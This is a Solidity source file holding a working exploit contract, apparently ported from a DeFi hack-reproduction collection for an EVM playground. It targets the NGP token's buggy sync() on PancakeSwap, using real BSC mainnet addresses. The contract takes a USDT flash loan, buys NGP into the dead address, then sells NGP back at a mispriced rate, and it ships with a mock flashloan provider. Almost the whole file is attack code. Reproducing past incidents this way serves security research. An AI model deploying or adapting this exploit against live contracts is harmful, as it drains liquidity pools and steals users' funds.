// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// SYNTHETIC exploit for the EVM Playground — a standalone deployable version of DeFiHackLabs'
// NGP_exp.sol NGP_EXP (the Foundry test IS the attacker, address(this) implements flashloanCallback()
// inline; the MockFlashloanProvider helper is deployed separately via helperContracts). Ported verbatim.
//
// Bug: NGP token's _update() calls sync() on its own PancakeSwap pair under certain transfer conditions
// (a fee-on-transfer / rebase-style side effect). By first dumping a large amount of USDT into the pair to
// buy NGP (routing it to a dead address to permanently reduce the pair's NGP balance), then selling NGP
// back to USDT, the second swap triggers the buggy sync() at a moment where the pair's real NGP balance is
// far lower than its cached reserve, mispricing the sell and extracting far more USDT than was borrowed.
contract NGPExploit {
    IERC20Metadata public ngpToken = IERC20Metadata(0xd2F26200cD524dB097Cf4ab7cC2E5C38aB6ae5c9);
    IERC20Metadata public usdt = IERC20Metadata(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter public router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public flashloanProvider;

    uint256 public constant FLASHLOAN_AMOUNT = 211_000_000 * 10 ** 18;

    constructor(address _flashloanProvider) {
        flashloanProvider = _flashloanProvider;
    }

    function run() external {
        IFlashLoanProvider(flashloanProvider).aggregateFlashloan();
    }

    function flashloanCallback() external {
        usdt.approve(address(router), type(uint256).max);
        ngpToken.approve(address(router), type(uint256).max);

        // step 2: swap USDT to NGP and send the NGP to the dead address — reduces the pair's NGP balance.
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(ngpToken);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(FLASHLOAN_AMOUNT, 0, path, deadAddress, block.timestamp);

        // step 3: swap NGP back to USDT — triggers the buggy sync() in NGP's _update(), mispricing the sell.
        path[0] = address(ngpToken);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(ngpToken.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        // step 4: repay the flash loan.
        usdt.transfer(flashloanProvider, FLASHLOAN_AMOUNT);
    }

    receive() external payable {}
}

interface IFlashLoanReceiver {
    function flashloanCallback() external;
}

/// @notice A mock flashloan provider for testing — ported verbatim from the original test file so the
/// helperContracts pipeline (which compiles helpers from the SAME artifact dir as the exploit) can find it.
contract MockFlashloanProvider {
    IERC20Metadata public usdt = IERC20Metadata(0x55d398326f99059fF775485246999027B3197955);

    function aggregateFlashloan() public {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.transfer(msg.sender, usdtBalance);
        IFlashLoanReceiver(msg.sender).flashloanCallback();
        require(usdt.balanceOf(address(this)) == usdtBalance, "Flashloan failed");
    }
}

interface IERC20Metadata {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFlashLoanProvider {
    function aggregateFlashloan() external;
}
